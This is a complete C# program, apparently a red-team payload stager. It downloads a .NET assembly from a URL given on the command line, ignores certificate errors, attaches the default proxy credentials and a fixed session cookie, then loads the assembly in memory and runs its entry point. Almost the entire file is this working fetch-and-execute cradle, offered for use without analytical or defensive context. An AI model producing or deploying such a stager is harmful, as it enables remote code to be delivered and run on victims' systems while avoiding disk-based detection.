using System;
using System.IO;
using System.Text;
using System.Net;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

public class Program
{
    public static HttpWebRequest WebClientAdvanced(string url)
    {
        //create a URI for the URL given
        Uri uri = new Uri(url);
        //create the HTTP request
        HttpWebRequest client = WebRequest.Create(uri) as HttpWebRequest;

        // Use GET to normalise the traffic
        client.Method = WebRequestMethods.Http.Get;

        // Get the default proxy if there is
        client.Proxy = new System.Net.WebProxy();
        // Get the credentials for the proxy if there is
        client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
        // Ignore the certificate issues if necessary
        client.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

        // Create a cookie container 
        CookieContainer cookies = new CookieContainer();
        // Add the session ID to the cookie
        cookies.Add(new Cookie("SESSIONID","123456789") { Domain = uri.Host });    
        // Assign the cookies to the request
        client.CookieContainer = cookies; 

        // Set a User-Agent for it
        client.UserAgent = ("Mozilla/31337");

        // Don't follow the redirects
        client.AllowAutoRedirect = false;
        // Return the client
        return client;
    }

    public static void Main(string[] args)
    {
        if (args.Length == 0) {
            // If there is no argument, say something nice. 
            Console.WriteLine("Give a URL to download and run the .NET assembly.");             
        }
        else {                
            Console.WriteLine("Downloading the .NET assembly.");
            // Generate an advanced web client
            HttpWebRequest client = WebClientAdvanced(args[0]);
            // Send the request and get the response
            HttpWebResponse response = client.GetResponse() as HttpWebResponse;
            
            Console.WriteLine("Processing the server response.");
            // Download the .NET assembly from a URL as data if response is OK
            // Defining the response body
            byte[] responsebody = new byte[] {};
            if (response.StatusCode == HttpStatusCode.OK)
            {
                // Read the headers for debugging
                Console.WriteLine("Raw server headers for debugging:");
                for (int i = 0; i < response.Headers.Count; i++ )
                    Console.WriteLine("\t"+response.Headers.GetKey(i) + ": " + response.Headers.Get(i).ToString());

                MemoryStream ms = new MemoryStream();
                response.GetResponseStream().CopyTo(ms);
                responsebody = ms.ToArray();

                //close the connection if it's finished
                response.Close();
            }
            else
            {
                Console.WriteLine("Server response is invalid: {0}", response.StatusCode);
            }

            // Response copied to the asm variable
            // byte[] asm = responsebody as byte[];
            // Call the .NET assembly execution for the data
            ExecDotNetAssembly(responsebody);
        }
    }

    static void ExecDotNetAssembly(byte[] asm)
    {
            // Loading the .NET Assembly
            System.Reflection.Assembly a = System.Reflection.Assembly.Load(asm);
            // Finding the Entry Point
            System.Reflection.MethodInfo method = a.EntryPoint;
            // Create the Instance for the Entry Point
            object o = a.CreateInstance(method.Name);
            // Setting the parameters for Invoke
            //object[] apo= { PARAMETERS };            
            object[] apo= { };
            // Invoking the Entry Point
            method.Invoke(o,apo);
            return;
    }


}